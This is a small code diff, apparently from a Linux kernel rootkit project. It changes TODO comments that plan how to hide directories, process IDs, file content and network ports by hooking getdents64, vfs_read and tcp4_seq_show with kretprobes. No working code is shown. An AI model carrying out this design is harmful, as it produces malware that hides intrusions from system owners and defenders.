@@ -96,13 +96,13 @@ static bool persist_requested;
 // TODO: Implement directory/PID hiding (M03)
 // kretprobe on __x64_sys_getdents64
 // Entry: capture dirp from args
-// Return: copy buffer, filter dirents using rk_target_prefix_match
+// Return: copy buffer, filter dirents using rk_target_match
 //   and rk_target_number_match, copy back, adjust return value
 
 // TODO: Implement content hiding (M06)
 // kretprobe on vfs_read
 // Return: scan buffer line by line, remove lines matching
-//   rk_target_substring_match(&content_targets, ...)
+//   rk_target_match(&content_targets, line, len)
 
 // TODO: Implement port hiding (M06)
 // kretprobe on tcp4_seq_show
